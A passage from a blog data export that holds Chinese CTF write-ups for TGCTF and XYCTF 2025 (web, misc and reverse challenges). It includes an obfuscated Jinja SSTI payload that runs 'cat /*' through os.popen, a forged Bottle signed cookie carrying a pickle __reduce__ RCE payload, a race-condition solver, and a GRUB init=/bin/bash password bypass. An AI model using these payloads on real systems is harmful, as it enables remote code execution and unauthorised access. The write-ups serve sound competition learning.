session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        tasks <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>RACE_CONDITION_JOBS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            tasks<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>raceValidationCheck<span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>VALID_CHECK_PARAMETER<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            tasks<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>raceValidationCheck<span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>INVALID_CHECK_PARAMETER<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">await</span> asyncio<span class=\"token punctuation\">.</span>gather<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>tasks<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">async</span> <span class=\"token keyword\">def</span> <span class=\"token function\">solve</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">async</span> <span class=\"token keyword\">with</span> aiohttp<span class=\"token punctuation\">.</span>ClientSession<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> session<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">await</span> asyncio<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># wait for the reverse proxy creation</span>\n\n            attempts <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n            finishedRaceConditionJobs <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n            <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'[*] Attempts #</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>attempts<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> - Finished race condition jobs: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>finishedRaceConditionJobs<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">'\\r'</span><span class=\"token punctuation\">)</span>\n\n                results <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> self<span class=\"token punctuation\">.</span>raceCondition<span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span>\n                attempts <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n                finishedRaceConditionJobs <span class=\"token operator\">+=</span> self<span class=\"token punctuation\">.</span>RACE_CONDITION_JOBS\n                <span class=\"token keyword\">for</span> result <span class=\"token keyword\">in</span> results<span class=\"token punctuation\">:</span>\n                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">if</span> <span class=\"token string\">'TGCTF&#123;'</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> result<span class=\"token punctuation\">:</span>\n                        <span class=\"token keyword\">continue</span>\n\n                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'\\n[+] We won the race window! Flag: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>result<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span>\n                    exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> name <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    baseUrl <span class=\"token operator\">=</span> <span class=\"token string\">'http://node1.tgctf.woooo.tech:30308'</span> <span class=\"token comment\"># for local testing</span>\n    <span class=\"token comment\"># baseUrl = 'http://49.13.169.154:8088'</span>\n    solver <span class=\"token operator\">=</span> Solver<span class=\"token punctuation\">(</span>baseUrl<span class=\"token punctuation\">)</span>\n\n    asyncio<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>solver<span class=\"token punctuation\">.</span>solve<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n\n<h3 id=\"直面天命（复仇）\"><a href=\"#直面天命（复仇）\" class=\"headerlink\" title=\"直面天命（复仇）\"></a>直面天命（复仇）</h3><p>直接去非复仇版本里读：</p>\n<p><a href=\"http://node1.tgctf.woooo.tech:31514/aazz?filename=a/b/c/d/secret.py\">http://node1.tgctf.woooo.tech:31514/aazz?filename=a/b/c/d/secret.py</a></p>\n<p>secret_key &#x3D; “直面天命”</p>\n<p>然后标准SSTI即可。unicode编码绕过。 。 </p>\n<pre class=\"language-bash\" data-language=\"bash\"><code class=\"language-bash\">直面天命g<span class=\"token punctuation\">[</span><span class=\"token string\">'\\u0070\\u006f\\u0070'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'\\u005f\\u005f\\u0062\\u0075\\u0069\\u006c\\u0074\\u0069\\u006e\\u0073\\u005f\\u005f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'\\u005f\\u005f\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u005f\\u005f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token string\">'so'</span><span class=\"token punctuation\">[</span>::-1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'\\u0070\\u006f\\u0070\\u0065\\u006e'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token string\">'cat /*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'\\u0072\\u0065\\u0061\\u0064'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>难违</code></pre>\n\n\n\n<h2 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h2><h3 id=\"next-is-the-end\"><a href=\"#next-is-the-end\" class=\"headerlink\" title=\"next is the end\"></a>next is the end</h3><p>手动打开文件夹，得到flag。</p>\n<p><img src=\"/images/1744633170179-41.png\" alt=\"img\"></p>\n<h3 id=\"where-it-is\"><a href=\"#where-it-is\" class=\"headerlink\" title=\"where_it_is\"></a>where_it_is</h3><p>百度识图找到另一个视角的正面图。</p>\n<p><img src=\"/images/1744633170179-42.png\" alt=\"img\"></p>\n<p>可以模糊看出学校名前两个字**”内湖”**，结合原图的职业二字，在360地图搜索找到对应学校。</p>\n<p><img src=\"/images/1744633170179-43.png\" alt=\"img\"></p>\n<p>旁边的站就是港墘站</p>\n<p>TGCTF{港墘站}</p>\n<h3 id=\"你的运气是好是坏？\"><a href=\"#你的运气是好是坏？\" class=\"headerlink\" title=\"你的运气是好是坏？\"></a>你的运气是好是坏？</h3><p>CTF自然常数（。</p>\n<p>flag{114514}</p>\n<h3 id=\"TeamGipsy-ctfer\"><a href=\"#TeamGipsy-ctfer\" class=\"headerlink\" title=\"TeamGipsy&amp;ctfer\"></a>TeamGipsy&amp;ctfer</h3><p>vm运行虚拟机，发现有密码。</p>\n<p>在开机时按shift，再按e修改，把ro quiet splash $vt_handoff修改为rw init&#x3D;&#x2F;bin&#x2F;bash，再按F10启动。</p>\n<p>然后找到用户名，修改密码为123即可。</p>\n<p><img src=\"/images/1744633170179-44.png\" alt=\"img\"></p>\n<p>桌面存在一个mimi.txt记录着之前的指令，发现之前启了两个容器，并且有mysql数据库。</p>\n<p><img src=\"/images/1744633170179-45.png\" alt=\"img\"></p>\n<p>重新start之前的docker，并且用文本文件里面的mysql密码连上flag，在其中一个docker的mysql数据库中可以找到flag。</p>\n<p><img src=\"/images/1744633170179-46.png\" alt=\"img\"></p>\n<p><img src=\"/images/1744633170179-47.png\" alt=\"img\"></p>\n<p>HZNUCTF{0H!_YOu_are_really_the_TeamGipsy_ctfer}</p>\n<h3 id=\"ez-zip\"><a href=\"#ez-zip\" class=\"headerlink\" title=\"ez_zip\"></a>ez_zip</h3><p>最外层直接爆破出zip密码为20250412，得到一个sh512.txt和End.zip，sh512.txt里面有一句话。</p>\n<p>打开End.zip发现里面是End文件夹以及flag.zip和一个sh512.txt，并且sh512.txt原大小为128字节。</p>\n<p>所以可知要将sh512.txt内容进行sha512加密，构建一个End.zip，进行明文爆破。</p>\n<p><img src=\"/images/1744633170179-48.png\" alt=\"img\"></p>\n<p>将sha512结果存放End&#x2F;sh512.txt</p>\n<p><img src=\"/images/1744633170179-49.png\" alt=\"img\"></p>\n<p>deflate压缩，压缩等级1。</p>\n<p><img src=\"/images/1744633170179-50.png\" alt=\"img\"></p>\n<p>使用ARCHPR进行明文攻击解压出flag.zip。</p>\n<p><img src=\"/images/1744633170179-51.png\" alt=\"img\"></p>\n<p>没法正常解压，使用010的zip模板进行修复。</p>\n<p>将frFileNameLength改为8，压缩方式改成DEFLATE保存，即可解压得到flag。</p>\n<p><img src=\"/images/1744633170179-52.png\" alt=\"img\"></p>\n<p><img src=\"/images/1744633170179-53.png\" alt=\"img\"></p>\n<p>TGCTF{Warrior_You_have_defeated_the_giant_dragon!}</p>\n<h3 id=\"这是啥o-o\"><a href=\"#这是啥o-o\" class=\"headerlink\" title=\"这是啥o_o\"></a>这是啥o_o</h3><p>给了一个gif发现后面有疑似二维码的碎片,拼接得到一个汉信码</p>\n<p><img src=\"/images/1744633170179-54.png\" alt=\"img\"></p>\n<p>扫描得到提示 time is your fortune ,efficiency is your life</p>\n<p>推测和gif的延迟时间有关,修改010的gif模板,打印一下延迟时间得到一组看起来就很像asicc的东西</p>\n<p><img src=\"/images/1744633170179-55.png\" alt=\"img\"></p>\n<p>解码得到flag</p>\n<pre class=\"language-Plain\" data-language=\"Plain\"><code class=\"language-Plain\">enc&#x3D;[84,71,67,84,70,123,89,111,117,95,99,97,117,103,104,116,95,117,112,95,119,105,116,104,95,116,105,109,101,33,125]\nfor i in enc:\n    print(chr(i),end&#x3D;&#39;&#39;)</code></pre>\n\n<blockquote>\n<p>TGCTF{You_caught_up_with_time!}</p>\n</blockquote>\n<h3 id=\"你能发现图中的秘密吗\"><a href=\"#你能发现图中的秘密吗\" class=\"headerlink\" title=\"你能发现图中的秘密吗?\"></a>你能发现图中的秘密吗?</h3><p>题目给出一个压缩包和一个png,压缩包有密码</p>\n<p>png查看red通道的lsb,发现密钥</p>\n<p><img src=\"/images/1744633170179-56.png\" alt=\"img\"></p>\n<p>解压后给了一个png一个pdf</p>\n<p>查看pdf的二进制数据发现有ps相关的东西,用ps打开,发现了隐藏的flag图层查看获得第二段flag</p>\n<p><img src=\"/images/1744633170179-57.png\" alt=\"img\"></p>\n<p>final_challenge2.png的一个chunk大小异常。</p>\n<p><img src=\"/images/1744633170179-58.png\" alt=\"img\"></p>\n<p>提取，补上png文件头文件尾，然后爆破宽高就可以找到正确的宽高图片。</p>\n<p><img src=\"/images/1744633170179-59.png\" alt=\"img\"></p>\n<p>flag{you_are_so_attentive_and_conscientous}</p>\n"},{"title":"XYCTF25 不知道 WP","date":"2025-04-07T12:00:45.000Z","typora-root-url":"./..","_content":"\n# 战队名：不知道\n\n**排名**：**1**\n\n![](/images/e859cd5cae823fc6e9ecd736647c7dab-1744626745337-9.png)\n\n## Web\n\n### ez_puzzle\n\n查看js源码，找到_3KH_函数判断输出flag的地方\n\n```python\nif (G > yw4) {\n      alert(O[s74](J74))\n    } else {\n      alert($vfeRha_calc(S74 + G / Rw4, Y74, $v5sNVR(vS4)))\n    }\n```\n\n运行到此处即可\n\n![](/images/image-1744626745337-3.png)\n\n### SignIn\n\n访问/secret 获得cookie \n\n疑似Bottle 框架的 signed cookie\n\nsigned cookie 构造\n\n`!4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=`是 base 64 编码的   HMAC - SHA 1 签名\n\n`gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu`是 base64 编码的 Python 数据，反序列化后应该是\n\n也就是说第二端可以通过pickle 序列化攻击实现 rce\n\n```python\nfrom bottle import SimpleCookie\nimport base64\nimport hmac\nimport hashlib\nimport pickle\n\ndef make_signed_cookie(secret, data):\n    pickled = pickle.dumps(data)\n    digest = hmac.new(secret.encode(), pickled, hashlib.sha1).digest()\n    cookie = '!' + base64.b64encode(digest).decode() + '?' + base64.b64encode(pickled).decode()\n    return cookie\n\n# 假设你已经拿到 secret 内容：\nsecret = \"\"  # ← 替换成实际值\ndata = {\"name\": \"admin\"}\nsigned_cookie = make_signed_cookie(secret, data)\nprint(\"伪造的 Cookie 值：\", signed_cookie)\n```\n\n通过/download 读取 签名\n\n![](/images/image-20250406194123399-1744626745337-4.png)\n\n```vbnet\nHell0_H@cker_Y0u_A3r_Sm@r7\n```\n\n```python\nfrom bottle import SimpleCookie\nimport base64\nimport hmac\nimport hashlib\nimport pickle\n\ndef make_signed_cookie(secret, data):\n    pickled = pickle.dumps(data)\n    digest = hmac.new(secret.encode(), pickled, hashlib.sha1).digest()\n    cookie = '!' + base64.b64encode(digest).decode() + '?' + base64.b64encode(pickled).decode()\n    return cookie\n\nsecret = \"Hell0_H@cker_Y0u_A3r_Sm@r7\"  \nclass Data(object):\n    def __reduce__(self):\n         \n        return (eval, (\"__import__('os').popen('cat /flag*>/test.txt').read()\",))\ndata = Data()\nencoded = base64.b64encode(pickle.dumps(data, -1))\nprint(encoded)\nsigned_cookie = make_signed_cookie(secret, data)\nprint(\"伪造的 Cookie 值：\", signed_cookie)\n```\n\n伪造cookie成功后再通过download 路由实现任意文件读取\n\n![](/images/image-20250406200423921-1744626745337-5.png)\n\n\n\n\n\n## Reverse\n\n### WARMUP\n\n网上抄的VBS解密代码\n\n```vbscript\nFunction Defuscator(vbs)\n    Dim t\n    t = InStr(1, vbs, \"Execute\", 1)\n    t = Mid(vbs, t + Len(\"Execute\"))\n    t = Eval(t)\n    Defuscator = t\nEnd Function\n\nDim fso, i, outFile\nConst ForReading = 1, ForWriting = 2\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\n\n    ' 创建或打开一个文件用于写入输出\n    Set outFile = fso.OpenTextFile(\"output.txt\", ForWriting, True)\n\n        For i = 0 To WScript.Arguments.Count - 1\n        Dim FileName\n        FileName = WScript.Arguments(i)\n        Dim MyFile\n        Set MyFile = fso.OpenTextFile(FileName, ForReading)\n            Dim vbs\n            vbs = MyFile.ReadAll\n            outFile.WriteLine Defuscator(vbs)\n            MyFile.Close\n        Next\n\n        outFile.Close\n        Set fso = Nothing\n```\n\noutput.txt:\n\n```vbscript\nMsgBox \"Dear CTFER. Have fun in XYCTF 2025!\"\nflag = InputBox(\"Enter the FLAG:\", \"XYCTF\")\nwefbuwiue = \"90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4\" ' 棰勮鐨凴C4鍔犲瘑缁撴灉锛堝崄鍏繘鍒舵牸寮忥級\nqwfe = \"rc4key\"\n\n' 淇鍚庣殑RC4鍔犲瘑鍑芥暟\nFunction RunRC(sMessage, strKey)\n    Dim kLen, i, j, temp, pos, outHex\n    Dim s(255), k(255)\n    \n    ' 鍒濆鍖栧瘑閽?\n    kLen = Len(strKey)\n    For i = 0 To 255\n        s(i) = i\n        k(i) = Asc(Mid(strKey, (i Mod kLen) + 1, 1)) ' 瀵嗛挜浣跨敤ASCII缂栫爜\n    Next\n    \n    ' KSA瀵嗛挜璋冨害\n    j = 0\n    For i = 0 To 255\n        j = (j + s(i) + k(i)) Mod 256\n        temp = s(i)\n        s(i) = s(j)\n        s(j) = temp\n    Next\n    \n    ' PRGA鍔犲瘑娴佺▼\n    i = 0 : j = 0 : outHex = \"\"\n    For pos = 1 To Len(sMessage)\n        i = (i + 1) Mod 256\n        j = (j + s(i)) Mod 256\n        temp = s(i)\n        s(i) = s(j)\n        s(j) = temp\n        \n        ' 鍔犲瘑骞惰浆涓哄崄鍏繘鍒?\n        Dim plainChar, cipherByte\n        plainChar = Asc(Mid(sMessage, pos, 1)) ' 鏄庢枃鎸堿SCII澶勭悊\n        cipherByte = s((s(i) + s(j)) Mod 256) Xor plainChar\n        outHex = outHex & Right(\"0\" & Hex(cipherByte), 2)\n    Next\n    \n    RunRC = outHex\nEnd Function\n\n' 涓婚獙璇侀€昏緫\nIf LCase(RunRC(flag, qwfe)) = LCase(wefbuwiue) Then\n    MsgBox \"Congratulations! Correct FLAG!\"\nElse\n    MsgBox \"Wrong flag.\"\nEnd If\n\n\n\n```\n\nRC4解密，密钥为**rc4key**\n\n![](/images/1-1744626745337-7.png)\n\nflag{We1c0me_t0_XYCTF_2025_reverse_ch@lleng3_by_th3_w@y_p3cd0wn's_chall_is_r3@lly_gr3@t_&_fuN!}\n\n### ezVM\n\n通过字符串界面里的unicorn和加密函数的一些特征发现是使用了unicorn框架调用了一串代码。\n\n找一个使用unicorn框架的程序进行bindiff恢复一些unicorn函数的符号。\n\n发现是调用了一串ARM64的代码字节进行模拟执行，将输入字符串传入加密返回，并附上了一些data和栈空间初始化。\n\n![](/images/2-1744626745337-6.png)\n\n![](/images/4-1744626745337-8.png)\n\n将以上调用write写入的数据提取，随便找一个ARM64框架的.so复制到对应地址，以便反编译看代码。\n\n最后得到一个函数，很清晰的看出里面是一个VM虚拟机执行的流程。\n\n![](/images/5-1744626745337-10.png)\n\n使用c++编写代码调用unicorn库进行模拟。\n\n使用Hook，在关键计算地址处进行Hook，输出各个计算流程以及数据。\n\n```cpp\n#include <iostream>\n#include <Windows.h>\n#include <string>\n#include <vector>\n#include <iostream>\n#include \"data.hpp\"\n#include \"unicorn/unicorn.h\"\n#pragma comment(lib,\"unicorn-import.lib\")\n\nstatic void hook_code(uc_engine* uc, uint64_t address, uint32_t size, void* user_data) {\n    uint64_t w0,w1,w2,w3,w4;\n\n    if (address == 0x1fac) \n    {\n        uc_reg_read(uc, UC_ARM64_REG_W1, &w1);\n        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);\n\n        printf(\"W3 = W1 ^ W0 --- %llx ^ %llx = %llx\\n\", w1,w0,w1^w0);\n    }\n    if (address == 0x2BE4)\n    {\n        uc_reg_read(uc, UC_ARM64_REG_W1, &w1);\n        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);\n\n        printf(\"W3 = W1 >> W0 --- %llx >> %llx = %llx\\n\", w1, w0, w1 >> w0);\n    }\n    if (address == 0x2DB4)\n    {\n        uc_reg_read(uc, UC_ARM64_REG_W1, &w1);\n        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);\n\n        printf(\"W3 = W1 << W0 --- %llx << %llx = %llx\\n\", w1, w0, w1 << w0);\n    }\n    if (address == 0x232C)\n    {\n        uc_reg_read(uc, UC_ARM64_REG_W3, &w3);\n        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);\n\n        printf(\"W2 = W0 & W3 --- %llx & %llx = %llx\\n\", w0, w3, w0 & w3);\n    }\n    if (address == 0x2054)\n    {\n        uc_reg_read(uc, UC_ARM64_REG_W3, &w3);\n        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);\n\n        printf(\"W2 = W0 ^ W3 --- %llx ^ %llx = %llx\\n\", w0, w3, w3 ^ w0);\n    }\n    if (address == 0x2238)\n    {\n        uc_reg_read(uc, UC_ARM64_REG_W3, &w3);\n        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);\n\n        printf(\"W2 = W0 ^ W3 --- %llx ^ %llx = %llx\\n\", w0, w3, w3 ^ w0);\n    }\n    if (address == 0x2180)\n    {\n        uc_reg_read(uc, UC_ARM64_REG_W1, &w1);\n        uc_reg_read(uc, UC_ARM64_REG_W4, &w4);\n\n        printf(\"W1 = W1 ^ W4 --- %llx ^ %llx = %llx\\n\", w1, w4, w1 ^ w4);\n    }\n    if (address == 0x1CC4)\n    {\n        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);\n        uc_reg_read(uc, UC_ARM64_REG_W1, &w1);\n        printf(\"W2 = W1 + W0 --- %llx + %llx = %llx\\n\", w1, w0, w1 + w0);\n    }\n    if (address == 0x1A0C)\n    {\n        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);\n        uc_reg_read(uc, UC_ARM64_REG_W1, &w1);\n        printf(\"W2 = W1 + W0 --- %llx + %llx = %llx\\n\", w1, w0, w1 + w0);\n    }\n}\n\nint main()\n{\n    uint8_t Input[] = \"11112222111111111111111111111111\";\n    uc_engine* uc{};\n    uc_hook hook;\n    uint64_t InputAddr = 0x14C28;\n    uint64_t Stack = 0x7F0000;\n    uint8_t MyEncFlag[100]{};\n    uint64_t Base = 0x0000000001000000;\n    uc_open(uc_arch::UC_ARCH_ARM64, uc_mode::UC_MODE_ARM, &uc);\n    uc_mem_map(uc, 0, Base, UC_PROT_ALL);\n    uc_mem_map(uc, Stack - 4096, 0x4000, UC_PROT_ALL);\n    uc_hook_add(uc, &hook, UC_HOOK_CODE, hook_code, NULL, 1, 0);\n    uc_mem_write(uc, 0x14C28, (LPVOID)&Input, 0x20u);\n    uc_mem_write(uc, 0x0C70, (LPVOID)&Code, 8840u);\n    uc_mem_write(uc, 0x14010, (LPVOID)Data1, 0x9B8u);\n    uc_mem_write(uc, 0x30F0, (LPVOID)&Data2, 0x54u);\n    uc_mem_write(uc, 0x149E8, (LPVOID)&Data3, 8u);\n    uc_reg_write(uc, 0xC7, (LPVOID)&InputAddr);// X0\n    uc_reg_write(uc, 4, (LPVOID)&Stack);       // SP\n    if (!uc_emu_start(uc, 0x0C70, 0x2EF4, 0, 0))\n    {\n        uc_mem_read(uc, InputAddr, &MyEncFlag, 48);\n    }\n    for (int i = 0; i < 32; i++)\n    {\n        printf(\"%X \", MyEncFlag[i]);\n    }\n    uc_close(uc);\n\treturn 0;\n}\n```\n\n最后运行输出得到一个vm加密流程\n\n以下是部分输出内容。\n\noutput:\n\n```cpp\nW3 = W1 << W0 --- 4 << 0 = 4\nW3 = W1 << W0 --- 4 << 1 = 8\nW3 = W1 >> W0 --- 32323232 >> 5 = 1919191\nW3 = W1 << W0 --- 32323232 << 6 = c8c8c8c80\nW3 = W1 ^ W0 --- 1919191 ^ 8c8c8c80 = 8d1d1d11\nW2 = W0 ^ W3 --- 32323232 ^ 11223344 = 23100176\nW2 = W1 + W0 --- 8d1d1d11 + 23100176 = b02d1e87\nW2 = W0 & W3 --- 0 & 3 = 0\nW2 = W1 + W0 --- 776f6853 + 0 = 776f6853\nW2 = W0 ^ W3 --- 776f6853 ^ abab1212 = dcc47a41\nW3 = W1 ^ W0 --- b02d1e87 ^ dcc47a41 = 6ce964c6\nW2 = W1 + W0 --- 6ce964c6 + 31313131 = 9e1a95f7\nW3 = W1 >> W0 --- 9e1a95f7 >> 4 = 9e1a95f\nW3 = W1 << W0 --- 9e1a95f7 << 7 = 4f0d4afb80\nW3 = W1 ^ W0 --- 9e1a95f ^ d4afb80 = 4ab52df\nW2 = W0 ^ W3 --- 9e1a95f7 ^ 55667788 = cb7ce27f\nW2 = W1 + W0 --- 4ab52df + cb7ce27f = d028355e\nW3 = W1 >> W0 --- 5f5fe6e7 >> b = bebfc\nW2 = W0 & W3 --- bebfc & 3 = 0\nW2 = W1 + W0 --- 776f6853 + 5f5fe6e7 = d6cf4f3a\nW2 = W0 ^ W3 --- d6cf4f3a ^ 23235566 = f5ec1a5c\nW3 = W1 ^ W0 --- f5ec1a5c ^ d028355e = 25c42f02\nW2 = W1 + W0 --- 25c42f02 + 32323232 = 57f66134\nW3 = W1 >> W0 --- 57f66134 >> 5 = 2bfb309\nW3 = W1 << W0 --- 57f66134 << 6 = 15fd984d00\nW3 = W1 ^ W0 --- 2bfb309 ^ fd984d00 = ff27fe09\nW2 = W0 ^ W3 --- 57f66134 ^ 11223344 = 46d45270\nW2 = W1 + W0 --- ff27fe09 + 46d45270 = 145fc5079\nW2 = W0 & W3 --- 5f5fe6e7 & 3 = 3\nW2 = W1 + W0 --- 74696564 + 5f5fe6e7 = d3c94c4b\nW2 = W0 ^ W3 --- d3c94c4b ^ abab1212 = 78625e59\nW3 = W1 ^ W0 --- 45fc5079 ^ 78625e59 = 3d9e0e20\nW2 = W1 + W0 --- 3d9e0e20 + 9e1a95f7 = dbb8a417\nW3 = W1 >> W0 --- dbb8a417 >> 4 = dbb8a41\nW3 = W1 << W0 --- dbb8a417 << 7 = 6ddc520b80\nW3 = W1 ^ W0 --- dbb8a41 ^ dc520b80 = d1e981c1\nW2 = W0 ^ W3 --- dbb8a417 ^ 55667788 = 8eded39f\nW2 = W1 + W0 --- d1e981c1 + 8eded39f = 160c85560\nW3 = W1 >> W0 --- bebfcdce >> b = 17d7f9\nW2 = W0 & W3 --- 17d7f9 & 3 = 1\nW2 = W1 + W0 --- 656b616d + bebfcdce = 1242b2f3b\nW2 = W0 ^ W3 --- 242b2f3b ^ 23235566 = 7087a5d\nW3 = W1 ^ W0 --- 7087a5d ^ 60c85560 = 67c02f3d\nW2 = W1 + W0 --- 67c02f3d + 57f66134 = bfb69071\nW3 = W1 >> W0 --- bfb69071 >> 5 = 5fdb483\nW3 = W1 << W0 --- bfb69071 << 6 = 2feda41c40\nW3 = W1 ^ W0 --- 5fdb483 ^ eda41c40 = e859a8c3\nW2 = W0 ^ W3 --- bfb69071 ^ 11223344 = ae94a335\nW2 = W1 + W0 --- e859a8c3 + ae94a335 = 196ee4bf8\nW2 = W0 & W3 --- bebfcdce & 3 = 2\nW2 = W1 + W0 --- 616d5f72 + bebfcdce = 1202d2d40\nW2 = W0 ^ W3 --- 202d2d40 ^ abab1212 = 8b863f52\nW3 = W1 ^ W0 --- 96ee4bf8 ^ 8b863f52 = 1d6874aa\nW2 = W1 + W0 --- 1d6874aa + dbb8a417 = f92118c1\nW3 = W1 >> W0 --- f92118c1 >> 4 = f92118c\nW3 = W1 << W0 --- f92118c1 << 7 = 7c908c6080\nW3 = W1 ^ W0 --- f92118c ^ 908c6080 = 9f1e710c\nW2 = W0 ^ W3 --- f92118c1 ^ 55667788 = ac476f49\nW2 = W1 + W0 --- 9f1e710c + ac476f49 = 14b65e055\nW3 = W1 >> W0 --- 1e1fb4b5 >> b = 3c3f6\nW2 = W0 & W3 --- 3c3f6 & 3 = 2\nW2 = W1 + W0 --- 616d5f72 + 1e1fb4b5 = 7f8d1427\nW2 = W0 ^ W3 --- 7f8d1427 ^ 23235566 = 5cae4141\nW3 = W1 ^ W0 --- 5cae4141 ^ 4b65e055 = 17cba114\nW2 = W1 + W0 --- 17cba114 + bfb69071 = d7823185\nW3 = W1 >> W0 --- d7823185 >> 5 = 6bc118c\nW3 = W1 << W0 --- d7823185 << 6 = 35e08c6140\nW3 = W1 ^ W0 --- 6bc118c ^ e08c6140 = e63070cc\nW2 = W0 ^ W3 --- d7823185 ^ 11223344 = c6a002c1\nW2 = W1 + W0 --- e63070cc + c6a002c1 = 1acd0738d\nW2 = W0 & W3 --- 1e1fb4b5 & 3 = 1\nW2 = W1 + W0 --- 656b616d + 1e1fb4b5 = 838b1622\nW2 = W0 ^ W3 --- 838b1622 ^ abab1212 = 28200430\nW3 = W1 ^ W0 --- acd0738d ^ 28200430 = 84f077bd\nW2 = W1 + W0 --- 84f077bd + f92118c1 = 17e11907e\nW3 = W1 >> W0 --- 7e11907e >> 4 = 7e11907\nW3 = W1 << W0 --- 7e11907e << 7 = 3f08c83f00\nW3 = W1 ^ W0 --- 7e11907 ^ 8c83f00 = f292607\nW2 = W0 ^ W3 --- 7e11907e ^ 55667788 = 2b77e7f6\nW2 = W1 + W0 --- f292607 + 2b77e7f6 = 3aa10dfd\nW3 = W1 >> W0 --- 7d7f9b9c >> b = faff3\nW2 = W0 & W3 --- faff3 & 3 = 3\nW2 = W1 + W0 --- 74696564 + 7d7f9b9c = f1e90100\nW2 = W0 ^ W3 --- f1e90100 ^ 23235566 = d2ca5466\nW3 = W1 ^ W0 --- d2ca5466 ^ 3aa10dfd = e86b599b\nW2 = W1 + W0 --- e86b599b + d7823185 = 1bfed8b20\nW3 = W1 >> W0 --- bfed8b20 >> 5 = 5ff6c59\nW3 = W1 << W0 --- bfed8b20 << 6 = 2ffb62c800\nW3 = W1 ^ W0 --- 5ff6c59 ^ fb62c800 = fe9da459\nW2 = W0 ^ W3 --- bfed8b20 ^ 11223344 = aecfb864\nW2 = W1 + W0 --- fe9da459 + aecfb864 = 1ad6d5cbd\nW2 = W0 & W3 --- 7d7f9b9c & 3 = 0\nW2 = W1 + W0 --- 776f6853 + 7d7f9b9c = f4ef03ef\nW2 = W0 ^ W3 --- 